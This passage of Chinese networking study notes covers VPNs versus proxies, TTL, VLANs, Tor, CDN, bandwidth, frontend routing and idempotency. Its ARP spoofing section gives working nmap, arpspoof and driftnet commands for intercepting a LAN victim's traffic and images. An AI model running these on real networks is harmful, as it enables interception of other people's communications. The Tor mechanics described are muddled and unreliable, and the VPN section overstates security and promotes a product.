Protocol）来达到发送端认证、消息保密与准确性等功能。”\n“代理（英语：Proxy）也称网络代理，是一种特殊的网络服务，允许一个（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击。”\n显而易见，单从定义我们就可以看出 VPN 的最大特点是采取隧道协议进行数据传输和保护。而代理使用的则是对应的代理协议。说到协议，以下是一些 VPN 和代理的常用协议：\n\n||加密协议名称|\n|--|--|\n|VPN|\tOpvenVPN、IPsec、IKEv2、PPTP、L2TP、WireGuard等|\n|代理|\tHTTP、HTTPS、SOCKS、FTP、RTSP等|\n\n注：不同的VPN 或代理协议会给用户带来不同的安全，隐私和速度体验。此处就不详说了\n\n### 流程区别\n因为协议引出了 VPN 和代理两者的工作流程区别，为了方便普通用户理解，我们将以流程图的方式展示它们各自的大致工作流程。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130834.png)\n\nVPN：VPN 需要登录客户端来获取使用许可。然后，VPN 服务通过隧道协议分别在用户端和 VPN 服务器之间以及VPN 服务器和目标网络地址之间建立隧道，对流量进行加密传输，从而达到不可穿透的效果。\n代理 / Proxy：代理跟 VPN 类似，中间会有一个代理服务器（Proxy Server）的存在。但是用户不用安装客户端，可直接通过在浏览器或具体 app 内进行代理地址和端口设置来创建连接到代理服务器。连接成功后，代理服务器就会使用代理协议来对目标网络地址或者服务器资源进行连接请求。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130843.png)\n\nVPN与代理复杂性对比结果：VPN 比代理工作流程更复杂，但对于用户来说更易用，不用进行参数配置，使用客户端登录即可。\n\n### 安全 & 隐私区别\nVPN：VPN 具有很高的安全性，因为它不仅可以给你分配 IP 地址轻松匿名，还会采用加密技术（如军攻级AES-256/128 和ECC加密）保护所有流量和数据，任何诸如机构、政府、广告商、网络服务商、黑客这样的的第三方均无法对你的真实数据进行采集。VPN 服务商一般也会采取零日志政策，不会去主动搜集贩卖用户信息。（当然免费 VPN 就不一定了，它可能会记录日志或者推送广告，所以一般不建议使用免费 VPN。）\n\n代理/ Proxy：代理的最大用处是回避过滤，突破上级对网站的屏蔽。上面我们列出了代理协议中， HTTP 代理，HTTPS代理和 SOCKS 代理这三种是主要用来访问网页的，安全性和价格依次递增。虽然在代理的整个过程也隐藏了使用者的真实 IP，但是由于使用代理类型和协议的不同，你的行为数据不仅不会被加密保护，还会被代理商保存为日志，潜在安全风险很高，因为你的网络行为依然能像往常一样被政府等机构监管，重要私人信息依然可能被网络犯罪分子轻易获取。另外，部分代理还会展示自己的广告，相当影响用户体验。\n\nVPN与代理安全/隐私性对比结果：VPN 比代理更安全，更能保证隐私。如果一定要使用代理，建议使用安全匿名系数最高的SOCKS5代理。\n\n### 速度区别\nVPN：VPN 的速度不好一概而论，因为它会受 VPN 协议、协议加密等级、VPN 服务器位置/负载/带宽、本地网络服务提供商（ISP）的 网络情况等因素的影响。简单来说，加密等级越低、距离VPN 服务器地址越近、服务器负载越小、服务器和本地网络宽带越充裕，VPN 访问速度越快，反之亦然。\n\n代理：跟 VPN 一样，代理的快慢也会受协议、距离、服务器性能、实际负载和本地网络情况的影响。但由于代理跟 VPN 不一样，并未进行复杂的加密处理和隧道保护，只是对源流量进行转发，其速度理论上说是要比 VPN 快的。而且，一般代理服务器都会有缓冲区（Cache）来对已请求的信息内容进行存储记忆，当再有用户访问同样的信息时，可以直接从缓冲区中将信息传给用户，进而提高访问速度。\n\nVPN与代理速度对比结果：在同样的外部环境和使用条件下，单从速度来说，代理比 VPN 更快。\n\n### VPN与代理对比总结\n1、VPN 和代理相比，谁更好？\n毫无疑问，VPN 比代理更好。\n首先，VPN 不仅具有代理的所有功能 – 实现匿名和突破地理访问限制，还会对数据进行强加密，防止被监管、窥视和二次利用。其次，高质量的消费级 VPN 软件服务商支持多种 VPN协议（包括代理协议），一般会在全球范围内分国家、地区和具体用途提供数千个服务器节点供用户选择，灵活度高。最后，很多 VPN 还会同步内置很多实用功能，比如测速工具，IP 地址检测工具，网络终止开关工具（又叫 Kill Switch），广告屏蔽工具等，可谓是“一具多用”。\n\n2、VPN 和代理相比，我应该选谁？\n无标准答案，按需选择即可。\n虽然 VPN无论从易用性和安全性来说都是优于代理的，但是从以上对比可以看出，代理的速度还是占有一席优势。这里给出的建议是：如果你对数据保护需求不大，只为了隐藏真实 IP 或者绕过一些诸如图书馆、学校、公司和国家地区设置的网络“墙”，进行快速翻墙上网，代理是可以作为首选的。如果你的工作或者生活需要一个稳定且可靠的翻墙工具保护你的在线数据，付费的优质 VPN 则是不二之选，比如熊猫VPN。\n\n### 什么时候应该使用VPN？\n总的来说我更推荐你使用VPN，因为VPN不仅能用来翻墙，并且还提供很好的安全匿名保护，并且使用简单，这些情况你应该使用VPN：\n- 翻墙看视频\n利用VPN的虚拟隧道技术，在连接上VPN服务器之后，播放音视频会比代理更加稳定。\n\n- 保持完全匿名\n如果你想在网上保持匿名和隐私安全，那么使用VPN是个不错的选择。大多数VPN提供商都有严格的无日志记录政策，这意味着它们不仅会隐藏你的IP地址，而且也没有将其存储，这使得没人能追溯到你的网络活动数据。\n\n- 访问受地理限制的内容\n使用VPN绕过地理限制要简单得多。由于VPN在全球分布有各种各样的服务器，因此你可以轻松地连接到一台服务器，这将帮助你绕过地区版权限制，很多海外华人就是利用VPN翻墙回国听歌刷剧。\n\n- 全局翻墙\nVPN不仅可以用于浏览器翻墙，而是可以将你电脑或手机上的所有应用翻墙。由于你的计算机上安装了VPN，因此网络上的任何活动都将通过VPN转发。这包括下载和上传文件，安装更新等。\n另外，即使在不稳定的条件下，你也将得到保护。假设你使用的是弱连接的公共Wi-Fi网络。即使连接断开，VPN仍将继续为你提供保护。另外，如果有人要拦截该连接，由于高度的加密，他们获得的任何信息都不可能被破解。\n\n- 用于种子下载\n大多数ISP如果检测到用户利用VPN进行种子下载，他们可能会将其限速。通过分析你的连接发送的数据包，它们可以确定你是使用连接进行种子下载还是常规的Web浏览。但是，由于VPN会加密通过连接发送的所有数据，因此它们无法检测你是否正在种子下载。\n\n### 什么时候应该使用代理？\n通常，利用代理进行翻墙是主要目的，这些情况下你可能需要用到代理：\n- 浏览器翻墙\n由于代理的技术原理，使得你可以利用它来进行翻墙，但在电脑上，你只能用在浏览器上翻墙，其他应用程序则需要配置。\n\n- 基本的隐私保护\n代理提供基本级别的隐私保护。你的网络流量将通过代理服务器转发，因此你尝试访问的网站将看到代理的IP地址，而不是你的真实IP地址。此过程提供了一些基本的保护。\n但是，由于代理服务器通常会记录用户活动日志，因此可以轻松发现你的真实IP地址和其他信息。\n\n- 减少定向广告\n也许你正试图摆脱每天看到的广告。如果你使用代理服务器进行常规的网络浏览，则这些广告将不会与你的IP地址绑定，也就无法定向推送给你。\n\n- 访问受地理限制的内容\n代理服务器另外一项有用的功能，是它能解锁受地理限制的网站内容。只需启动代理服务器，你就可以快速查看被封锁的站点。但是，当你要访问受地理限制的内容时，你需要使用正确位置的代理服务器。例如，如果你要观看在中国遭到封锁的Netflix系列节目，则需要使用基于美国的代理服务器。\n总体而言，代理是一种轻量级的翻墙工具，它没有提供更多附加的功能，而VPN提供的功能则更加完善。\n\n# ping中的TTL详解\n以下就是ping曙光博客的返回值：\n```\nC:\\Documents and Settings\\user>ping www.ezloo.com\nPinging www.ezloo.com [66.235.202.42] with 32 bytes of data:\nReply from 66.235.202.42: bytes=32 time=254ms TTL=51\nReply from 66.235.202.42: bytes=32 time=256ms TTL=51\nRequest timed out.\nReply from 66.235.202.42: bytes=32 time=260ms TTL=51\n\nPing statistics for 66.235.202.42:\nPackets: Sent = 4, Received = 3, Lost = 1 (25% loss),\nApproximate round trip times in milli-seconds:\nMinimum = 254ms, Maximum = 260ms, Average = 256ms\n```\n\n从结果中我们可以看出曙光博客的服务器的IP地址是：66.235.202.42，所用的时间是256ms等，那TTL等与51是什么意思呢？\n\nTTL是生存时间的意思，就是说这个ping的数据包能在网络上存在多少时间。当我们对网络上的主机进行ping操作的时候，我们本地机器会发出一个数据包，数据包经过一定数量的路由器传送到目的主机，但是由于很多的原因，一些数据包不能正常传送到目的主机，那如果不给这些数据包一个生存时间的话，这些数据包会一直在网络上传送，导致网络开销的增大。当数据包传送到一个路由器之后，TTL就自动减1，如果减到0了还是没有传送到目的主机，那么就自动丢失。就像上面ping曙光博客的时候第三次那样，出现Request timed out的情况，增加TTL来减少网络资源的消耗。默认情况下，Linux系统的TTL值为64或255，Windows NT/2000/XP系统的TTL值为128，Windows 98系统的TTL值为32，UNIX主机的TTL值为255。（这个是从网络上找到的），曙光博客的目的主机是采用FreeBSD系统的，在这里可能TTL值是64，而不是UNIX主机的255，所以在从我这里到目的主机经过了64-51=13个路由。当我们不知道目的主机的操作系统的时候我们可以根据TTL来猜测，但是不一定100%准确，如果目的主机是windows，但是经过了比如75个路由器，那么TTL的返回值是128-75=53，那么你可能认为这个目的主机是Linux系统，但是一般不会经过那么多的路由器，所以通过TTL来判断目的主机的操作系统还是有一定的依据的。\n\n\n<font color=\"red\">注： 我们在window系统上使用ping时， 由于window的TTL默认为128, 所以在window上发的数据包可以经过127个路由器， 但是在终端上回显的TTL的值是目的主机上的TTL默认值减去数据包经过的路由器数, 因为目的主机回复数据包中的TTL字段初始值为目的主机的TTL初始值</font>\n\n# VLAN\n## VLAN产生的原因\nVLAN的产生是为了解决广播域的问题， 由于使用路由器可以隔离广播域， 但是路由器的成本高， 所以产生了VLAN技术\n## 交换机实现VLAN\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130853.png)\n\nVLAN的实现机制： IEEE 802.1Q帧(用来区分数据帧是属于哪个VLAN)、 交换机端口类型(对帧进行打标签成为IEEE 802.1Q帧， 对IEEE 802.1Q帧去标签称为普通帧)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130902.png)\n\n## 交换机端口类型\n交接接口类型包括： Access、Trunk、Hybrid\n端口的缺省VLAN ID:\n1. 在思科交换机上称为Native VLAN, 即本征VLAN\n2. 在华为交换机上称为PVID(Port VLAN ID),即端口VLAN ID\n3. 思科交换机支持Access、Trunk端口\n4. 华为交换机支持Access、Trunk、Hybrid端口\n\n**Access**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130916.png)\n\n**Trunk**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130949.png)\n\n**Hybrid**\n\nhybrid端口是换位交换机所特有的\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409130959.png)\n\n\n# 开热点访问设备\n**情景：**\n打开手机热点， 然后电脑连接该热点， 此时电脑如何访问该手机\n\n**方法：**\n首先要知道开热点的机器的能与外网访问的网卡地址， 而连接到该热点的机器都能访问到这个网卡地址， 并且也是通过这个网卡来与外网进行通信的\n由于是手机开的热点， 所以找到手机本身的ip地址\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131024.png)\n\n注： 这个地址会在手机重启后发生变换\n电脑直接访问该ip地址即可访问手机， 手机也可以通过访问电脑的无线网卡的ip地址来访问电脑\n\n\n# arp欺骗\nARP 欺骗是一种以 ARP 地址解析协议为基础的一种网络攻击方式, 那么什么是 ARP 地址解析协议: 首先我们要知道, 一台电脑主机要把以太网数据帧发送到同一局域网的另外一台主机, 它的底层是通过 48bit 的 Mac 地址来确定目的接口的, 但是我们在应用层是使用 IP 地址来访问目标主机的, 所以 ARP 的作用就是当一台主机访问一个目标 IP 地址的时候, 它为该主机返回目标 IP 主机的 Mac 地址, 并且这个过程是自动完成的, 应用层的程序是不用关心这件事的.\n\n在讲 ARP 欺骗之前我们先来了解一下正常情况下一台主机是如何通过路由器上网的:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131035.png)\n\n如上图, 我们以 A 主机 ping 8.8.8.8 为例:\n1. 主机 A 上执行 ping 8.8.8.8\n2. 主机 A 准备根据默认路由将数据包发送给 192.168.0.1, 但是最开始的时候主机 A 不知道 192.168.0.1 的 Mac 地址, 所以主机 A 广播一条 ARP Request, 询问 192.168.0.1 的 Mac 地址是什么\n3. 路由器收到该 ARP 请求, 发现自己是 192.168.0.1 于是向主机 A 回复一条 ARP Reply, 告诉主机 A 192.168.0.1 的 Mac 地址是 xxxGW.\n4. 主机 A 收到该 ARP Reply, 并使用该 Reply 中的 MAC 地址封一个 ICMP Request 包, 然后将包发出去\n5. 路由器收到该 ICMP 包, 发现目标 IP 是公网 IP, 便将该包放送到公网, 公网返回 ICMP Reply 给路由器\n6. 路由器准备将 ICMP Reply 发送给 192.168.0.100, 但是同第2步, 路由器最开始的时候也不知道 192.168.0.100 的 Mac 地址是多少, 所以路由器会广播一条 ARP Request, 询问 192.168.0.100 的 Mac 地址是什么\n7. 主机 A 收到 ARP Request, 发现自己是 192.168.0.100, 于是向路由器回复 ARP Reply, 告诉路由器 192.168.0.100 的 Mac 地址是 xxxA.\n8. 路由器收到 ARP Reply, 并使用该 Reply 中的 MAC 地址将第5步收到 ICMP Reply 包重新封包, 并发送出去\n9. 主机 A 收到 ICMP Reply\n\n至此, 正常的上网流程结束. 然后对照上面的流程回答下面两个问题:\n1. 如果主机 B 无脑的向主机 A 发送 ARP Reply, 告诉 A 192.168.0.1 的 MAC 是 xxxB, 会发生什么?\n2. 如果主机 B 无脑的向路由器 GW 发送 ARP Reply, 告诉 GW 192.168.0.100 的 MAC 是 xxxB, 会发生什么?\n\n答案如下图:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131046.png)\n\n如果主机 B 做了上面说的两件事的话, 那么主机 A 访问网络的所有数据都会先经过主机 B, 并且回来的数据也都会经过 B, 至此, 整个 ARP 欺骗完成.\n\n## 实战\n1. 首先获取当前局域网的网络\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131057.png)\n\n所以当前网络为192.168.1.0/24\n\n然后使用如下命令来探测当前局域网的主机\n```\nnmap -sP 192.168.1.0/24\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131121.png)\n\n2. 接下使用主机B来arp欺骗主机A与默认路由\n至于实际操作, 在自己的机器上安装一个 arpspoof 工具便可以, Ubuntu 下可以直接使用如下命令安装:\n```\napt install dsniff\n```\n\n安装好之后先打开 IP 转发(如果为关闭(即填写0)， 则主机A发给主机B的数据不会转发出去， 从而导致主机A无法与外界联系，  注： 关闭主机B的ip转发，对自己访问路由器是没有影响的，依然能访问网络):\n```\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n然后使用 arpspoof 命令进行欺骗, 命令使用方法如下:\n```\narpspoof -i <网卡名> -t <欺骗的目标> <我是谁>\n```\n\n比如上面我举得例子, 分别开两个终端:\n终端1, 欺骗主机 A 我是网关\n```\narpspoof -i eth0 -t 192.168.0.100 192.168.0.1\n```\n\n终端2, 欺骗网关我是主机 A\n```\narpspoof -i eth0 -t 192.168.0.1 192.168.0.100\n```\n欺骗成功之后可以通过抓包工具查看主机 A 所有的流量, 这里不再多说.\n\n\n## 使用arp嗅探来拦截图片\n主机B想要拦截主机A的图片，  那么主机B只需要告诉默认路由器我是主机A即可\n```\narpspoof -i eth0 -t 192.168.0.1 192.168.0.100\n```\n\n然后在终端中输入如下命令即可\n```\ndriftnet -i eth0\n```\n\n# 暗网\n暗网并不是专门架设的一个独立的互联网，它使用的就是我们正常互联网的传输线路的网络服务器，之所以能隔绝于正常的互联网中而自成一派，就是因为暗网使用的一套费尽心机的工作原理。\n在我们日常使用的互联网中，访客通过域名访问一个网站时，访问请求会首先到达域名解析服务器DNS，该服务器会把域名转换为对应的网站ip地址，再发送给访客，然后访客端通过网络上的若干个节点服务器，连接到网站ip地址所在的服务器。这个访问过程，网络上所有的节点服务器都会得知并记录访客信息和网站的ip地址，所以我们的访问过程会在网络上留下印记。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131132.png)\n\n而暗网的访问过程则不同，比如暗网中的老大Tor网络，它由全球数前台加入了Tor网络的服务器组成。在Tor网络里如果要访问一个正常的网站，同样由DNS服务器将域名转换为ip地址发送给客户端，当客户端发出连接网站ip的请求时，就会连接到`Tor网络的目录服务器`，这台服务器将访客身份和网站ip等信息加密打包3次并随机选择Tor网络里的3台节点服务器依次解密信息来完成连接。首先目录服务器将打包信息发送给`入口节点`，这台服务器解密最外层的加密信息后，会得知访客身份并和用户端连接，同时还得知需要将剩下的信息发送给`中间节点`，中间节点收到信息后又将最外层解密得知需要连接`入口节点`，并将剩下的信息发送给`汇合点`，而汇合点收到信息后解密得知需要连接中间节点，同时还需要连接网站的ip，然后汇合点通过正常的网络节点连接到网站ip所在的服务器。这个过程中，3台节点服务器都无法完全得知用户信息和网站ip，因此Tor网络的访客访问网站的过程无法追踪。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131146.png)\n\n虽然上述过程中，访客被隐藏了，但访客要访问的网站的ip仍然会被正常网络的节点服务器记录到，所以在Tor网络里的网站服务器ip地址也需要被隐藏。方法是当网站建好以后，需要把网站ip等信息发送给Tor网络里的`分布式散列表服务器`，该服务器就会启用3个节点服务器准备连接，同时生成一个以`.onion`结尾的域名，当访客访问到这个域名时，访问请求就会被目录服务器打包加密3次，然后经过3个节点依次解密，最后由汇合点连接到分布式散列表服务器，该服务器将域名对应的ip地址和访问请求进行三层加密，发送给网站`出口节点服务器`\t，出口节点解密后，得知需要与汇合点连接，并将其余信息发送给网站中间节点，当中间节点收到信息并解密后，得知需要连接出口节点，并将剩下的信息发送给网站入口节点，入口节点解密最后一层信息后，得知需要连接中间节点，同时知道网站的ip地址然后与网站连接，经过一番折腾，访客通过入口节点、中间节点、汇合点、网站出口节点、网站中间节点、网站入口节点一共6台服务器，终于和网站进行了连接。**这个过程只有与访客连接的入口节点知道访客的身份, 只有与网站连接的入口节点知道网站的ip，剩下的节点对网站和访客都一无所知。**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131156.png)\n\n其实Tor就是一种代理，不过它比比一般的一重代理要高明得多，它是一种多重代理。用一重代理有一个坏处：如果一重代理本身是恶意的（想象一下你的VPN提供商是恶意的），那么它就可以知道你访问过什么网站。显然，这不能满足我们的“谁都不能知道是我访问了网站”的隐私需求。\n\n# CDN\nCDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户**就近**获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409131012.png)\n\n# NAS\nNAS（Network Attached Storage：网络附属存储）按字面简单说就是连接在网络上，具备资料存储功能的装置，因此也称为“网络存储器”。它是一种专用数据存储服务器。它以数据为中心，将存储设备与服务器彻底分离，集中管理数据，从而释放带宽、提高性能、降低总拥有成本、保护投资。其成本远远低于使用服务器存储，而效率却远远高于后者。目前国际著名的NAS企业有Netapp、EMC、OUO等\n\n# 带宽与宽带的区别 \n带宽是量词，指的是网速的大小，比如1Mbps的意思是一兆比特每秒，这个数值就是指带宽。\n宽带是名词，说明网络的传输速率速很高 。宽带的标准各不相同，最初认为128kbps以上带宽的就是宽带，而以下的就是窄带。但现在国内运营商一般提供至少512kbps带宽的宽带服务。也就是说，带宽是一个具体的数值，而宽带则是满足一定带宽数值的一种传输标准(服务)。\n\n\n# 上行带宽和下行带宽\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220115225919.png)\n\n常用带宽传输，分为上行、下行宽带，也就是常说的“上传”和“下载”。那么上行宽带和下行宽带是什么？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211224165851.png)\n\n\n## 对于用户来说 \n对于用户来说，上行带宽即上行速率一般是指从你的电脑上传的速度，别人从你的电脑进行通讯的速率。下行带宽即下行速率是指网络向用户电脑发送信息时的传输速率，从网上下载文件，影响下载速度的就是“下行速率”。\n\n上行宽带(速度)和下行宽带(速度)是不对称的，一般是下行速度大于上行的速度。我们平时所使用的宽带说多少M，都是指的下行宽带，因为我们上网主要是从互联网上下载数据，而上传的数据量要少很多。\n\n## 对于服务器来说\n而对于服务器而言，上行宽带即上传数据速率，就是服务器对外发送数据所占用的带宽速率。服务器作为服务终端。很多文件、网站图片，等放在服务器上。当用户打开服务器上的网站，获取网站源文件、网站图片等，其实就是服务器对外发送数据的一个过程。所以，在服务器上放网站，做代理等，使用的都是上行带宽。\n\n下行宽带即下载数据速率，就是服务器从外部下载文件，服务器打开其他网站，所使用的带宽速度。服务器本机，从外部下载文件，下载软件，是使用下行带宽。\n\n客户端下载资源消耗的是服务器的上行流量，客户端上传资源消耗的是服务器的下行流量。\n\n一般买的带宽指的是上行带宽，下行通常是不限的。而且流量的计算一般都是以上行的来计算的。所以，客户端上传资源，对服务器的带宽基本没有影响，因为服务器的下行基本不限的，跟客户端本身网络的带宽有影响；而客户端下载资源，除了跟服务器的带宽有影响，跟客户端本身的网络带宽也有影响的。可以联想到百度网盘的上传与下载\n\n# 前端路由与后端路由\n## 什么是路由\n路由是根据不同的 url 地址展示不同的内容或页面；\n\n## 什么是前端路由？\n很重要的一点是页面不刷新，前端路由就是把不同路由对应不同的内容或页面的任务交给前端来做，每跳转到不同的URL都是使用前端的锚点路由。随着（SPA）单页应用的不断普及，前后端开发分离，目前项目基本都使用前端路由，在项目使用期间页面不会重新加载。\n\n优点：\n- 用户体验好，和后台网速没有关系，不需要每次都从服务器全部获取，快速展现给用户\n- 可以再浏览器中输入指定想要访问的url路径地址。\n- 实现了前后端的分离，方便开发。有很多框架都带有路由功能模块。\n\n缺点:\n- 使用浏览器的前进，后退键的时候会重新发送请求，没有合理地利用缓存\n- 单页面无法记住之前滚动的位置，无法在前进，后退的时候记住滚动的位置\n\n### 主要实现方式\n在单页面web网页中, 单纯的浏览器地址改变, 网页不会重载，如单纯的hash网址改变网页不会变化，因此我们的路由主要是通过监听事件，并利用js实现动态改变网页内容，有两种实现方式：\n- `hash模式`：监听浏览器地址hash值变化，执行相应的js切换网页；\n- `history模式`：利用history API实现url地址改变，网页内容改变；\n它们的区别最明显的就是hash会在浏览器地址后面增加#号，而history可以自定义地址。\n\n#### hash模式\n使用window.location.hash属性及窗口的onhashchange事件，可以实现监听浏览器地址hash值变化，执行相应的js切换网页。下面具体介绍几个使用过程中必须理解的要点：\n- hash指的是地址中#号以及后面的字符，也称为散列值。hash也称作锚点，本身是用来做页面跳转定位的。如`http://localhost/index.html#abc`，这里的#abc就是hash；\n- 散列值是不会随请求发送到服务器端的，所以改变hash，不会重新加载页面；\n- 监听 window 的 hashchange 事件，当散列值改变时，可以通过 location.hash 来获取和设置hash值；\n- location.hash值的变化会直接反应到浏览器地址栏；\n\n**触发hashchange事件的几种情况：**\n- 浏览器地址栏散列值的变化（包括浏览器的前进、后退）会触发window.location.hash值的变化，从而触发onhashchange事件；\n- 当浏览器地址栏中URL包含哈希如`http://www.baidu.com/#home`，这时按下输入，浏览器发送`http://www.baidu.com/`请求至服务器，请求完毕之后设置散列值为#home，进而触发onhashchange事件；\n- 当只改变浏览器地址栏URL的哈希部分，这时按下回车，浏览器不会发送任何请求至服务器，这时发生的只是设置散列值新修改的哈希值，并触发onhashchange事件；\n- html中`<a>`标签的属性 href 可以设置为页面的元素ID如 #top，当点击该链接时页面跳转至该id元素所在区域，同时浏览器自动设置 window.location.hash 属性，地址栏中的哈希值也会发生改变，并触发onhashchange事件；\n\n```js\n//设置 url 的 hash，会在当前url后加上'#abc'\nwindow.location.hash='abc';\nlet hash = window.location.hash //'#abc'\n\nwindow.addEventListener('hashchange',function(){\n\t//监听hash变化，点击浏览器的前进后退会触发\n})\n```\n\n#### history模式\nwindow.history 属性指向 History 对象，它表示当前窗口的浏览历史。当发生改变时，只会改变页面的路径，不会刷新页面。History 对象保存了当前窗口访问过的所有页面网址。通过 history.length 可以得出当前窗口一共访问过几个网址。由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。\n\n#### 属性\nHistory 对象主要有两个属性。\n- `History.length`：当前窗口访问过的网址数量（包括当前网页）\n- `History.state`：History 堆栈最上层的状态值（详见下文）\n```js\n// 当前窗口访问过多少个网页\nhistory.length // 1\n\n// History 对象的当前状态\n// 通常是 undefined，即未设置\nhistory.state // undefined\n```\n\n#### 方法\nHistory.back()、History.forward()、History.go()这三个方法用于在历史之中移动。\n- `History.back()`：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。\n- `History.forward()`：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。\n- `History.go()`：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为0，相当于刷新当前页面。\n```js\nhistory.back();\nhistory.forward();\nhistory.go(1);//相当于history.forward()\nhistory.go(-1);//相当于history.back()\nhistory.go(0); // 刷新当前页面\n```\n\n<font color=\"red\">注意：移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。</font>\n\n\n#### history.pushState \n该方法用于在历史中添加一条记录。pushState()方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有变化。语法：`history.pushState(object, title, url)`\n\n该方法接受三个参数，依次为：\n- object：是一个对象，通过 pushState 方法可以将该对象内容传递到新页面中。如果不需要这个对象，此处可以填 null。\n- title：指标题，几乎没有浏览器支持该参数，传一个空字符串比较安全。\n- url：新的网址，必须与当前页面处在同一个域。不指定的话则为当前的路径，如果设置了一个跨域网址，则会报错。\n```js\nvar data = { foo: 'bar' };\nhistory.pushState(data, '', '2.html');\nconsole.log(history.state) // {foo: \"bar\"}\n```\n注意：如果 pushState 的 URL 参数设置了一个新的锚点值（即 hash），并不会触发 hashchange 事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。\n\n如果 pushState() 方法设置了一个跨域网址，则会报错。\n```js\n// 报错\n// 当前网址为 http://example.com\nhistory.pushState(null, '', 'https://twitter.com/hello');\n```\n上面代码中，pushState 想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。\n\n#### history.replaceState\n该方法用来修改 History 对象的当前记录，用法与 pushState() 方法一样。\n\n假定当前网页是 example.com/example.html。\n```js\nhistory.pushState({page: 1}, '', '?page=1')\n// URL 显示为 http://example.com/example.html?page=1\n\nhistory.pushState({page: 2}, '', '?page=2');\n// URL 显示为 http://example.com/example.html?page=2\n\nhistory.replaceState({page: 3}, '', '?page=3');\n// URL 显示为 http://example.com/example.html?page=3\n\nhistory.back()\n// URL 显示为 http://example.com/example.html?page=1\n\nhistory.back()\n// URL 显示为 http://example.com/example.html\n\nhistory.go(2)\n// URL 显示为 http://example.com/example.html?page=3\n```\n\n#### popstate 事件\n每当 history 对象出现变化时，就会触发 popstate 事件。\n\n注意：仅仅调用pushState()方法或replaceState()方法 ，并不会触发该事件;只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用History.back()、History.forward()、History.go()方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。页面第一次加载的时候，浏览器不会触发popstate事件。使用的时候，可以为popstate事件指定回调函数，回调函数的参数是一个 event 事件对象，它的 state 属性指向当前的 state 对象。\n```js\nwindow.addEventListener('popstate', function(e) {\n\t//e.state 相当于 history.state\n\tconsole.log('state: ' + JSON.stringify(e.state));\n\tconsole.log(history.state);\n});\n```\n点击查看 通过history.pushState 实现页面 tab 切换的功能。\n\nhistory 致命的缺点就是当改变页面地址后，强制刷新浏览器时，（如果后端没有做准备的话）会报错，因为刷新是拿当前地址去请求服务器的，如果服务器中没有相应的响应，会出现 404 页面。\n\n\n## 什么是后端路由？\n浏览器在地址栏中切换不同的url时，每次都向后台服务器发出请求，服务器响应请求，在后台拼接html文件传给前端显示, 返回不同的页面，意味着浏览器会刷新页面，网速慢的话说不定屏幕全白再有新内容。后端路由的另外一个极大的问题就是 前后端不分离。\n\n优点：\n- 分担了前端的压力，html和数据的拼接都是由服务器完成。\n\n缺点：\n- 当项目十分庞大时，加大了服务器端的压力，同时在浏览器端不能输入制定的url路径进行指定模块的访问。\n- 如果当前网速过慢，那将会延迟页面的加载，对用户体验不是很友好。\n\n# 四种幂等性解决方案\n\n## 什么是幂等性？\n`幂等`是一个数学与计算机学概念，在数学中某一元运算为幂等时，其作用在任一元素两次后会和其作用一次的结果相同。\n\n> 在计算机中编程中，一个幂等操作的特点是其任意多次执行所产生的影响均与一次执行的影响相同。\n\n幂等函数或幂等方法是指可以使用相同参数重复执行，并能获得相同结果的函数。这些函数不会影响系统状态，也不用担心重复执行会对系统造成改变。\n\n## 什么是接口幂等性？\n在`HTTP/1.1`中，对幂等性进行了定义。**它描述了一次和多次请求某一个资源对于资源本身应该具有同样的结果**（网络超时等问题除外），即第一次请求的时候对资源产生了副作用，但是以后的多次请求都不会再对资源产生副作用。\n\n这里的副作用是不会对结果产生破坏或者产生不可预料的结果。也就是说，其任意多次执行对资源本身所产生的影响均与一次执行的影响相同。\n\n## 为什么需要实现幂等性？\n在接口调用时一般情况下都能正常返回信息不会重复提交，不过在遇见以下情况时可以就会出现问题，如：\n1. **前端重复提交表单**： 在填写一些表格时候，用户填写完成提交，很多时候会因网络波动没有及时对用户做出提交成功响应，致使用户认为没有成功提交，然后一直点提交按钮，这时就会发生重复提交表单请求。\n2. **用户恶意进行刷单**： 例如在实现用户投票这种功能时，如果用户针对一个用户进行重复提交投票，这样会导致接口接收到用户重复提交的投票信息，这样会使投票结果与事实严重不符。\n3. **接口超时重复提交**：很多时候 HTTP 